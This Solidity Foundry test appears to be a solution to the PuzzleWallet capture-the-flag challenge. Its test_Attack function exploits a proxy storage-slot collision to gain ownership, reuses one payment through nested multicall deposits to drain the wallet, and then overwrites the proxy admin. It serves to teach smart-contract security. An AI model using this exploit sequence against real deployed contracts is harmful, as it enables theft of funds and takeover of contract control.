// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {PuzzleWallet, PuzzleProxy} from "../src/PuzzleWallet.sol";

contract PuzzleWalletTest is Test {
    address payable public puzzleProxy;

    address public admin = address(1);
    address public owner = address(2);
    address public user = address(3);

    function setUp() public {
        {
            address payable puzzleWallet = payable(address(new PuzzleWallet()));
            puzzleProxy = payable(address(new PuzzleProxy(admin, puzzleWallet, "")));   
        }

        PuzzleProxy(puzzleProxy).proposeNewAdmin(owner);
        assertEq(PuzzleWallet(puzzleProxy).owner(), owner, "Must have expected owner");

        vm.prank(owner);
        PuzzleWallet(puzzleProxy).addToWhitelist(user);
        vm.prank(user);
        PuzzleWallet(puzzleProxy).setMaxBalance(2 ether);

        vm.deal(user, 1 ether);
        vm.prank(user);
        PuzzleWallet(puzzleProxy).deposit{value: 1 ether}();
    }

    function test_Attack() public {
        PuzzleProxy(puzzleProxy).proposeNewAdmin(address(this));
        PuzzleWallet(puzzleProxy).addToWhitelist(address(this));
        PuzzleWallet(puzzleProxy).addToWhitelist(puzzleProxy);

        bytes memory deposit = abi.encodeWithSelector(PuzzleWallet(puzzleProxy).deposit.selector);
        // bytes memory executeDeposit = abi.encodeWithSelector(PuzzleWallet(puzzleProxy).execute.selector, puzzleProxy, 1 ether, deposit);
        bytes memory depositMulti;
        {
            bytes[] memory m = new bytes[](1);
            m[0] = deposit;
            depositMulti = abi.encodeWithSelector(PuzzleWallet(puzzleProxy).multicall.selector, m);
        }
        bytes memory empty = "";
        bytes memory drain = abi.encodeWithSelector(PuzzleWallet(puzzleProxy).execute.selector, address(this), 2 ether, empty);

        bytes[] memory multiCallData = new bytes[](3);
        multiCallData[0] = deposit;
        multiCallData[1] = depositMulti;
        multiCallData[2] = drain;

        PuzzleWallet(puzzleProxy).multicall{value: 1 ether}(multiCallData);

        // assertEq(PuzzleWallet(puzzleProxy).balances(address(this)), 2 ether);
        assertEq(puzzleProxy.balance, 0 ether);

        PuzzleWallet(puzzleProxy).setMaxBalance(uint256(uint160(address(this))));
        assertEq(PuzzleProxy(puzzleProxy).admin(), address(this));
    }

    receive() external payable {

    }
}
